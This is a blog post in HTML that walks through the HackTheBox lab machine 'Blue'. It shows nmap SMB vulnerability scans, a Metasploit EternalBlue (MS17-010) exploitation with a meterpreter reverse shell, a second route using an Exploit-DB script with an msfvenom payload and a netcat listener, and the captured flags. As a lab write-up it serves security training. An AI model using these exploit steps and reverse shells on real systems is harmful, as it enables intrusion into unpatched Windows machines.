@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Blue Writeup / Walkthrough Hack the box</title>
+
+  <link rel="icon" type="image/png" href="/assets/images/logo.png?v=96ad5fd1fb">
+  <link rel="apple-touch-icon" href="/assets/images/logo.png?v=96ad5fd1fb">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Space+Grotesk:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link rel="stylesheet" href="/assets/css/style.css?v=96ad5fd1fb">
+
+  <meta name="description" content="This is a writeup on Blue (Windows HackTheBox), running SMB. Exploitation invades the Eternal Blue MS17-010 vulnerability.">
+    <link rel="canonical" href="https://sheerazali.com/blog/blue-writeup-walkthroughs-hack-the-box/">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta property="og:site_name" content="Sheeraz Ali">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Blue Writeup / Walkthrough Hack the box">
+    <meta property="og:description" content="This is a writeup on Blue (Windows HackTheBox), running SMB. Exploitation invades the Eternal Blue MS17-010 vulnerability.">
+    <meta property="og:url" content="https://sheerazali.com/blog/blue-writeup-walkthroughs-hack-the-box/">
+    <meta property="og:image" content="https://i0.wp.com/sheerazali.com/wp-content/uploads/2021/06/Copy-of-BLOG-THUMBNAILS-1.png?fit&#x3D;1920%2C1080&amp;ssl&#x3D;1">
+    <meta property="article:published_time" content="2021-06-09T05:54:48.000Z">
+    <meta property="article:modified_time" content="2021-06-09T09:56:48.000Z">
+    <meta property="article:tag" content="HackTheBox">
+    <meta property="article:tag" content="Writeup">
+    
+    <meta property="article:publisher" content="https://www.facebook.com/ghost">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Blue Writeup / Walkthrough Hack the box">
+    <meta name="twitter:description" content="This is a writeup on Blue (Windows HackTheBox), running SMB. Exploitation invades the Eternal Blue MS17-010 vulnerability.">
+    <meta name="twitter:url" content="https://sheerazali.com/blog/blue-writeup-walkthroughs-hack-the-box/">
+    <meta name="twitter:image" content="https://i0.wp.com/sheerazali.com/wp-content/uploads/2021/06/Copy-of-BLOG-THUMBNAILS-1.png?fit&#x3D;1920%2C1080&amp;ssl&#x3D;1">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="sheeraz ali">
+    <meta name="twitter:label2" content="Filed under">
+    <meta name="twitter:data2" content="HackTheBox, Writeup">
+    <meta name="twitter:site" content="@beingsheerazali">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="675">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Sheeraz Ali",
+        "url": "https://sheerazali.com/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://sheerazali.com/favicon.ico"
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "sheeraz ali",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://www.gravatar.com/avatar/b78e4b3b7f8de6d5dafee8306d76ace7?s=250&r=x&d=mp",
+            "width": 250,
+            "height": 250
+        },
+        "url": "https://sheerazali.com/author/sheeraz/",
+        "sameAs": []
+    },
+    "headline": "Blue Writeup / Walkthrough Hack the box",
+    "url": "https://sheerazali.com/blog/blue-writeup-walkthroughs-hack-the-box/",
+    "datePublished": "2021-06-09T05:54:48.000Z",
+    "dateModified": "2021-06-09T09:56:48.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://i0.wp.com/sheerazali.com/wp-content/uploads/2021/06/Copy-of-BLOG-THUMBNAILS-1.png?fit=1920%2C1080&ssl=1",
+        "width": 1200,
+        "height": 675
+    },
+    "keywords": "HackTheBox, Writeup",
+    "description": "This is a writeup on Blue (Windows HackTheBox), running SMB. Exploitation invades the Eternal Blue MS17-010 vulnerability.",
+    "mainEntityOfPage": "https://sheerazali.com/blog/blue-writeup-walkthroughs-hack-the-box/"
+}
+    </script>
+
+    <meta name="generator" content="Ghost 5.130">
+    <link rel="alternate" type="application/rss+xml" title="Sheeraz Ali" href="https://sheerazali.com/rss/">
+    <script defer src="https://cdn.jsdelivr.net/ghost/portal@~2.51/umd/portal.min.js" data-i18n="true" data-ghost="https://sheerazali.com/" data-key="15f06e61ecb8d951198e7015b6" data-api="https://sheerazali.com/ghost/api/content/" data-locale="en" crossorigin="anonymous"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
+.gh-post-upgrade-cta {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    text-align: center;
+    width: 100%;
+    color: #ffffff;
+    font-size: 16px;
+}
+
+.gh-post-upgrade-cta-content {
+    border-radius: 8px;
+    padding: 40px 4vw;
+}
+
+.gh-post-upgrade-cta h2 {
+    color: #ffffff;
+    font-size: 28px;
+    letter-spacing: -0.2px;
+    margin: 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta p {
+    margin: 20px 0 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta small {
+    font-size: 16px;
+    letter-spacing: -0.2px;
+}
+
+.gh-post-upgrade-cta a {
+    color: #ffffff;
+    cursor: pointer;
+    font-weight: 500;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a:hover {
+    color: #ffffff;
+    opacity: 0.8;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a.gh-btn {
+    display: block;
+    background: #ffffff;
+    text-decoration: none;
+    margin: 28px 0 0;
+    padding: 8px 18px;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+}
+
+.gh-post-upgrade-cta a.gh-btn:hover {
+    opacity: 0.92;
+}</style>
+    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/sodo-search.min.js" data-key="15f06e61ecb8d951198e7015b6" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/main.css" data-sodo-search="https://sheerazali.com/" data-locale="en" crossorigin="anonymous"></script>
+    
+    <link href="https://sheerazali.com/webmentions/receive/" rel="webmention">
+    <script defer src="/public/cards.min.js?v=96ad5fd1fb"></script>
+    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=96ad5fd1fb">
+    <script defer src="/public/member-attribution.min.js?v=96ad5fd1fb"></script><style>:root {--ghost-accent-color: #FF1A75;}</style>
+</head>
+<body class="post-template tag-hackthebox tag-writeup tag-hash-import-2026-01-05-15-55">
+
+<div class="terminal-wrapper">
+
+  <header class="site-header">
+  <div class="container">
+    <div class="header-content">
+
+      <a href="https://sheerazali.com/" class="site-logo">
+        <img src="/assets/images/logo.png" alt="Sheeraz Ali">
+      </a>
+
+      <nav class="main-nav">
+        <ul>
+          <li><a href="https://sheerazali.com/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>home<span class="bracket">]</span></a></li>
+          <li><a href="/blog/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>blog<span class="bracket">]</span></a></li>
+          <li><a href="/timeline/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>timeline<span class="bracket">]</span></a></li>
+          <li><a href="/resume/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>resume<span class="bracket">]</span></a></li>
+          <li><a href="https://www.codevigilant.com/author/syed_sheeraz_ali/" target="_blank" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>cves<span class="bracket">]</span></a></li>
+          <li><a href="https://sheerazali.com/#contact" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>contact<span class="bracket">]</span></a></li>
+        </ul>
+      </nav>
+
+      <div class="header-status">
+        <span class="status-indicator">
+          <span class="status-dot"></span>
+          <span class="status-text">Online</span>
+        </span>
+      </div>
+
+    </div>
+  </div>
+</header>
+
+  <main class="main-content">
+    
+<article class="single-post">
+  <div class="container">
+
+    <header class="post-header">
+      <div class="post-meta-top">
+        <a href="https://sheerazali.com/tag/hackthebox/" class="post-category">HackTheBox</a>
+        <span class="post-date">June 09, 2021</span>
+        <span class="reading-time">8 min read</span>
+      </div>
+
+      <h1 class="post-title glitch" data-text="Blue Writeup / Walkthrough Hack the box">Blue Writeup / Walkthrough Hack the box</h1>
+
+      <div class="post-author">
+        <span class="author-label">Author:</span>
+        <a href="https://sheerazali.com/author/sheeraz/">sheeraz ali</a>
+      </div>
+    </header>
+
+    <div class="featured-image">
+      <img src="https://i0.wp.com/sheerazali.com/wp-content/uploads/2021/06/Copy-of-BLOG-THUMBNAILS-1.png?fit&#x3D;1920%2C1080&amp;ssl&#x3D;1" alt="Blue Writeup / Walkthrough Hack the box">
+    </div>
+
+    <div class="post-body">
+      <div class="content-wrapper">
+        <div class="terminal-window">
+          <div class="terminal-header">
+            <span class="terminal-dot red"></span>
+            <span class="terminal-dot yellow"></span>
+            <span class="terminal-dot green"></span>
+            <span class="terminal-title">Blue Writeup / Walkthrough Hack the box</span>
+          </div>
+          <div class="terminal-content">
+            <figure class="kg-card kg-image-card"><img src="/assets/images/blog/2021_06_image-2.png" class="kg-image" alt="Blue Writeup HackTheBox" loading="lazy" width="770" height="456"></figure><h2 id="tldr">TL;DR</h2><p><strong>T</strong>his is a writeup on Blue which is a Windows box categorized as easy on HackTheBox, and is primarily based on the exploitation of the <strong>Eternal Blue MS17-010</strong> exploit without requiring the need for any privilege escalation to obtain the root flag.</p><h2 id="walkthrough">Walkthrough</h2><p>This writeup explains both, exploitation with and without Metasploit.</p><h2 id="blue-writeup-scanning-network">Blue Writeup: Scanning Network</h2><p>Let’s start off by running the usual initial nmap scan.</p><pre><code class="language-bash">Nmap 7.91 scan initiated as: nmap -sC -sV -n -v -A -oN nmap.initial 10.129.73.158
+ Increasing send delay for 10.129.73.158 from 0 to 5 due to 195 out of 648 dropped probes since last increase.
+ Nmap scan report for 10.129.73.158
+ Host is up (0.17s latency).
+ Not shown: 991 closed ports
+
+ PORT      STATE SERVICE      VERSION
+ 135/tcp   open  msrpc        Microsoft Windows RPC
+ 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+ 445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+ 49152/tcp open  msrpc        Microsoft Windows RPC
+ 49153/tcp open  msrpc        Microsoft Windows RPC
+ 49154/tcp open  msrpc        Microsoft Windows RPC
+ 49155/tcp open  msrpc        Microsoft Windows RPC
+ 49156/tcp open  msrpc        Microsoft Windows RPC
+ 49157/tcp open  msrpc        Microsoft Windows RPC
+
+ No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+ Uptime guess: 0.006 days (since Wed Jun  2 11:34:09 2021)
+ Network Distance: 2 hops
+ TCP Sequence Prediction: Difficulty=264 (Good luck!)
+ IP ID Sequence Generation: Incremental
+ Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+ Host script results:
+ |clock-skew: mean: -19m57s, deviation: 34m37s, median: 1s 
+ | smb-os-discovery:  
+ |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) 
+ |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional 
+ |   Computer name: haris-PC |   NetBIOS computer name: HARIS-PC\x00 
+ |   Workgroup: WORKGROUP\x00 
+ |  System time: 2021-06-02T16:42:28+01:00
+ | smb-security-mode: 
+ |   account_used: guest
+ |   authentication_level: user
+ |   challenge_response: supported
+ |_  message_signing: disabled (dangerous, but default)
+ | smb2-security-mode: 
+ |   2.02: 
+ |_    Message signing enabled but not required
+ | smb2-time: 
+ |   date: 2021-06-02T15:42:31
+ |_  start_date: 2021-06-02T15:34:23
+ TRACEROUTE (using port 1720/tcp)
+ HOP RTT       ADDRESS
+ 1   168.18 ms 10.10.14.1
+ 2   168.38 ms 10.129.73.158
+ Read data files from: /usr/bin/../share/nmap
+ OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</code></pre><p>We have a plenty of open ports here. Although, <strong>Microsoft RPC</strong> on port <strong><code>135</code></strong>, <strong>netbios-ssn</strong> on port <code><strong>139</strong> </code>and  <strong>Microsoft-DS (Directory Services)</strong> <strong>SMB</strong> on port <code><strong>445</strong></code> seem to be the juicy ones, along with the PC name being seen as “haris-PC”.</p><p>The version on port 445 says that this box is running “Windows 7 Professional 7601 SP1”, and with the box name itself “Blue” we can really look forward to expecting the <strong><a href="//www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwiRjuiYkPzwAhVIWysKHV9FDQMQFjAAegQIBRAD&amp;url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FEternalBlue&amp;usg=AOvVaw3dFnZpj9DdFE4aqmBsmK4x" rel="noreferrer noopener">EternalBlue (MS17-010)</a></strong> vulnerability here. Let’s just confirm it by running the available nmap scripts for SMB vulnerabilities.</p><p>In simple words, <a href="//www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwjfsaCVhPzwAhXE7HMBHYZvAQIQFjAAegQIBRAD&amp;url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FServer_Message_Block&amp;usg=AOvVaw03baDASMJH_UKJb12cPPfa" rel="noreferrer noopener">Server Message Block Protocol (SMB protocol)</a> is basically a client-server communication protocol used for sharing access to files, printers, serial ports, and other resources on a network.</p><h3 id="checking-for-smb-vulnerabilities-using-nmap-scripts">Checking for SMB vulnerabilities using Nmap scripts</h3><p>We have the following list of nmap scripts targeted towards verifying any SMB vulnerabilities on the target.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_06_image.png" class="kg-image" alt="Blue Writeup HackTheBox nmap SMB scripts" loading="lazy" width="708" height="380"><figcaption>List of nmap SMB vulnerability scripts</figcaption></figure><p>PS- The above list also includes the MS17-010 vulnerability.</p><p>Let’s run these SMB targeted scripts on the target using nmap.</p><pre><code class="language-bash">┌─[root@kali]─[~/Desktop/Blue HTB]
+ └──╼ nmap --script smb-vuln* -sV -v -p 139,445 10.129.156.45
+ Starting Nmap 7.91 ( https://nmap.org )
+ Nmap scan report for 10.129.156.45
+ Host is up (0.19s latency).
+
+ PORT    STATE SERVICE      VERSION
+ 139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+ 445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+ Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+ Host script results:
+ |smb-vuln-ms10-054: false 
+ |_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND 
+ | smb-vuln-ms17-010:  
+ |   VULNERABLE: 
+ |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) 
+ |     State:   VULNERABLE 
+ |     IDs:  CVE:CVE-2017-0143 
+ |     Risk factor: HIGH 
+ |       A critical remote code execution vulnerability exists in Microsoft SMBv1 
+ |        servers (ms17-010). 
+ |            
+ |     Disclosure date: 2017-03-14 
+ |     References: 
+ |      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ 
+ |      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx 
+ |      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+ NSE: Script Post-scanning.
+ Read data files from: /usr/bin/../share/nmap
+ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 
+ Nmap done: 1 IP address (1 host up) scanned in 24.22 seconds
+            Raw packets sent: 6 (240B) | Rcvd: 3 (116B)</code></pre><p>Great! The box is vulnerable to the Eternal_Blue MS17-010 exploit as expected. Let’s move ahead with the exploitation phase using metasploit.</p><h2 id="blue-writeup-exploitation-with-metasploit">Blue Writeup: Exploitation (with Metasploit)</h2><p>Firing up the Metasploit framework and using the MS17-010 exploit on the target.</p><p>Please note that your LHOST must be set to the HackTheBox VPN network IP address.</p><pre><code class="language-bash">msf5 &gt; search ms17-010
+ Matching Modules
+ #  Name                                           Disclosure Date  Rank     Check  Description
+ ----                                           ---------------  ----     -----  -----------
+ 0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+ 1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
+ 2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+ 3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
+ 4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+ 5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution 
+
+ msf5 &gt; use 2
+
+ msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show options
+ Module options (exploit/windows/smb/ms17_010_eternalblue):
+ Name           Current Setting  Required  Description
+    ----           ---------------  --------  -----------
+    RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
+    RPORT          445              yes       The target port (TCP)
+    SMBDomain      .                no        (Optional) The Windows domain to use for authentication
+    SMBPass                         no        (Optional) The password for the specified username
+    SMBUser                         no        (Optional) The username to authenticate as
+    VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
+    VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
+ Exploit target:
+ Id  Name
+    --  ----
+    0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+
+ msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 10.129.156.45
+
+ msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcp
+ payload =&gt; windows/x64/meterpreter/reverse_tcp
+
+ msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit
+
+ [-] 10.129.156.45:445 - Exploit failed: The following options failed to validate: LHOST.
+ [*] Exploit completed, but no session was created.
+ msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set LHOST 10.10.14.53
+ LHOST =&gt; 10.10.14.53
+ msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit
+ [] Started reverse TCP handler on 10.10.14.53:4444  [] 10.129.156.45:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+ [+] 10.129.156.45:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+ [] 10.129.156.45:445     - Scanned 1 of 1 hosts (100% complete) [] 10.129.156.45:445 - Connecting to target for exploitation.
+ [+] 10.129.156.45:445 - Connection established for exploitation.
+ [+] 10.129.156.45:445 - Target OS selected valid for OS indicated by SMB reply                                                                                    
+ [] 10.129.156.45:445 - CORE raw buffer dump (42 bytes)                                                                                                            [] 10.129.156.45:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes                                                             
+ [] 10.129.156.45:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv                                                              [] 10.129.156.45:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1                                                                   
+ [+] 10.129.156.45:445 - Target arch selected valid for arch indicated by DCE/RPC reply                                                                            
+ [] 10.129.156.45:445 - Trying exploit with 12 Groom Allocations.                                                                                                  [] 10.129.156.45:445 - Sending all but last fragment of exploit packet                                                                                           
+ [] 10.129.156.45:445 - Starting non-paged pool grooming                                                                                                           [+] 10.129.156.45:445 - Sending SMBv2 buffers                                                                                                                      [+] 10.129.156.45:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.                                                                      [] 10.129.156.45:445 - Sending final SMBv2 buffers.                                                                                                              
+ [] 10.129.156.45:445 - Sending last fragment of exploit packet!                                                                                                   [] 10.129.156.45:445 - Receiving response from exploit packet                                                                                                    
+ [+] 10.129.156.45:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!                                                                                
+ [] 10.129.156.45:445 - Sending egg to corrupted connection.                                                                                                       [] 10.129.156.45:445 - Triggering free of corrupted buffer.                                                                                                      
+ [] Sending stage (201283 bytes) to 10.129.156.45                                                                                                                  [] Meterpreter session 1 opened (10.10.14.53:4444 -&gt; 10.129.156.45:49158) at 2021-06-03 09:46:36 -0400                                                                                                                                                                                                                 
+ [+] 10.129.156.45:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=                                                                             
+ [+] 10.129.156.45:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=                                                                             
+ [+] 10.129.156.45:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=      
+                                                                       
+ meterpreter &gt; sysinfo                                                                                                                                             
+ Computer        : HARIS-PC
+ OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+ Architecture    : x64
+ System Language : en_GB
+ Domain          : WORKGROUP
+ Logged On Users : 0
+ Meterpreter     : x64/windows
+
+ meterpreter &gt; getuid
+ Server username: NT AUTHORITY\SYSTEM
+
+ meterpreter &gt; shell
+ Process 2904 created.
+ Channel 1 created.
+ Microsoft Windows [Version 6.1.7601]
+ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+ C:\Windows\system32&gt; whoami
+ whoami
+ nt authority\system
+ C:\Users&gt; dir
+ dir
+  Volume in drive C has no label.
+  Volume Serial Number is A0EF-1911
+ Directory of C:\Users
+ 21/07/2017  07:56    
+          .
+ 21/07/2017  07:56              ..
+ 21/07/2017  07:56              Administrator
+ 14/07/2017  14:45              haris
+ 12/04/2011  08:51              Public
+                0 File(s)              0 bytes
+                5 Dir(s)  17,254,989,824 bytes free                                                                                                                         </code></pre><p>Oh man, this was pretty easy! We are right away <strong>AUTHORITY\SYSTEM</strong> .</p><h2 id="blue-writeup-exploitation-without-metasploit">Blue Writeup: Exploitation (without Metasploit)</h2><p>Searching for the MS17-010 exploit.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_06_image-4.png" class="kg-image" alt="Blue HackTheBox Writeup: Searching for exploit" loading="lazy" width="770" height="208"><figcaption>Searching for exploit</figcaption></figure><p>Let’s create a copy of this exploit to our current directory. If you didn’t already know, instead of copying we can also specify the exploit ID along with the –mirror flag in <code>searchsploit</code> to create a copy of the exploit in the current directory.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_06_image-5.png" class="kg-image" alt="Blue HackTheBox Writeup: Copying the exploit" loading="lazy" width="770" height="130"><figcaption>Copying the exploit</figcaption></figure><p>After frisking through the exploit code, I figured the following alterations that were needed to be done.</p><ul><li>After a lil enumeration we found out that “guest” login is allowed on the machine, so we need to add ‘guest’ in the USERNAME field of the exploit.</li></ul><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_06_image-7.png" class="kg-image" alt loading="lazy" width="770" height="194"><figcaption>enu4linux results</figcaption></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_06_image-9.png" class="kg-image" alt loading="lazy" width="257" height="72"><figcaption>USERNAME</figcaption></figure><ul><li>Creating a reverse shell payload using msfvenom, and specifying the path to this payload in the exploit.<br></li></ul><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_06_image-11.png" class="kg-image" alt loading="lazy" width="770" height="124"><figcaption>msfvenom payload</figcaption></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_06_image-12.png" class="kg-image" alt loading="lazy" width="770" height="103"><figcaption>adding path to payload</figcaption></figure><p>Let’s now open a listener on port 4444</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_06_image-14.png" class="kg-image" alt loading="lazy" width="405" height="113"><figcaption>listener port 4444</figcaption></figure><p>And run the MS17-010 python exploit.</p><pre><code class="language-bash">┌─[root@kali]─[~/Desktop/BlueHTB]
+└──╼ python 42315.py 10.129.159.0</code></pre><p>Getting a reverse shell.</p><pre><code class="language-bash">┌─[root@kali]─[~/Desktop/BlueHTB]
+└──╼ nc -nlvp 4444 
+listening on [any] 4444 ... 
+connect to [10.10.14.6] from (UNKNOWN) [10.10.10.40] 49158 
+Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. 
+
+C:\Windows\system32&gt;whoami 
+nt authority\system</code></pre><p>We are <strong>AUTHORITY\SYSTEM</strong> . Let’s quickly retrieve the flags.</p><h3 id="blue-writeup-user-flag">Blue Writeup: User Flag</h3><pre><code class="language-bash">C:\Users&gt; cd haris\Desktop 
+
+C:\Users\haris\Desktop&gt; type user.txt
+4c546aea7dbee75cbd71de245c8deea9</code></pre><h3 id="blue-writeup-root-flag">Blue Writeup: Root Flag</h3><pre><code class="language-bash">C:\Users&gt; cd Administrator\Desktop\ 
+
+C:\Users\Administrator\Desktop&gt; type root.txt 
+ff548eb71e920ff6c08843ce9df4e717 </code></pre><p>Until next time, do checkout our other writeups <a href="https://sheerazali.com/">here</a>.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="post-tags">
+      <span class="tags-label">Tags:</span>
+      <a href="/tag/hackthebox/" class="tag">HackTheBox</a>
+      <a href="/tag/writeup/" class="tag">Writeup</a>
+    </div>
+
+  </div>
+</article>
+
+  <section class="related-posts">
+    <div class="container">
+      <h3 class="section-title"><span class="prefix">./</span>related_writeups</h3>
+      <div class="related-grid">
+        <a href="/blog/raining-cves-on-wordpress-plugins-using-semgrep-slide-deck/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Raining CVE&#x27;s on wordpress plugins using Semgrep Slide Deck</h4>
+          <span class="date">Sep 10, 2022</span>
+        </a>
+        <a href="/blog/shibboleth-writeup-walkthrough-hack-the-box/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Shibboleth Writeup / Walkthrough Hack the box</h4>
+          <span class="date">Feb 10, 2022</span>
+        </a>
+        <a href="/blog/horizontall-writeup-walkthrough-hack-the-box/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Horizontall Writeup / Walkthrough Hack the box</h4>
+          <span class="date">Feb 05, 2022</span>
+        </a>
+      </div>
+    </div>
+  </section>
+
+  </main>
+
+  <footer class="site-footer">
+  <div class="container">
+    <div class="footer-content">
+      <div class="footer-brand">
+        <span class="terminal-prefix">&gt;</span>
+        <span class="brand-text">sheeraz_ali</span>
+        <span class="cursor">_</span>
+      </div>
+      <div class="footer-links">
+        <a href="https://www.linkedin.com/in/sheeraz-ali-979943177/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin"></i></a>
+        <a href="https://www.youtube.com/@sheerazali" target="_blank" title="YouTube"><i class="fab fa-youtube"></i></a>
+        <a href="https://twitter.com/BeingSheerazAli" target="_blank" title="Twitter/X"><i class="fab fa-twitter"></i></a>
+        <a href="https://github.com/pwnmeow" target="_blank" title="GitHub"><i class="fab fa-github"></i></a>
+      </div>
+      <div class="footer-copy">
+        <span class="cmd-prompt">$</span>
+        <span class="cmd-text">echo</span>
+        <span class="cmd-string">"&copy; 2026 Sheeraz Ali. All rights reserved."</span>
+      </div>
+    </div>
+  </div>
+</footer>
+
+</div>
+
+<script src="/assets/js/main.js?v=96ad5fd1fb"></script>
+
+
+</body>
+</html>
